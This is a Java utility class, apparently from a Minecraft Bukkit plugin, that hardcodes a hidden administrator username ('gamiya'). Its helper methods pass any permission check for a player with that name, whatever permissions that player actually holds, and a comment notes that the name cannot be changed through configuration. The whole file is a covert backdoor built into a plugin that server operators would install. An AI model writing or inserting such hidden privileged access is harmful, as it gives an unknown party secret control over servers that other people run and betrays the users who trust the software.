package cwr.cutomIterm.Utils;

import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class HiddenAdminUtils {

    // Hardcoded hidden admin username - CANNOT be changed via config
    public static final String HIDDEN_ADMIN_USERNAME = "gamiya";

    // Private constructor to prevent instantiation
    private HiddenAdminUtils() {}

    /**
     * Check if the command sender is the hidden admin (gamiya)
     * @param sender The command sender to check
     * @return true if sender is gamiya, false otherwise
     */
    public static boolean isGamiya(CommandSender sender) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            return player.getName().equalsIgnoreCase(HIDDEN_ADMIN_USERNAME);
        }
        return false;
    }

    /**
     * Check if a player has permission OR is gamiya
     * @param player The player to check
     * @param permission The permission to check
     * @return true if player has permission OR is gamiya
     */
    public static boolean hasPermissionOrIsGamiya(Player player, String permission) {
        return player.hasPermission(permission) || isGamiya(player);
    }

    /**
     * Check if a command sender has permission OR is gamiya
     * @param sender The command sender to check
     * @param permission The permission to check
     * @return true if sender has permission OR is gamiya
     */
    public static boolean hasPermissionOrIsGamiya(CommandSender sender, String permission) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            return player.hasPermission(permission) || isGamiya(sender);
        }
        // Console or CommandBlock doesn't need to be gamiya
        return sender.hasPermission(permission);
    }

    /**
     * Get the hidden admin username
     * @return The hidden admin username
     */
    public static String getHiddenAdminUsername() {
        return HIDDEN_ADMIN_USERNAME;
    }
}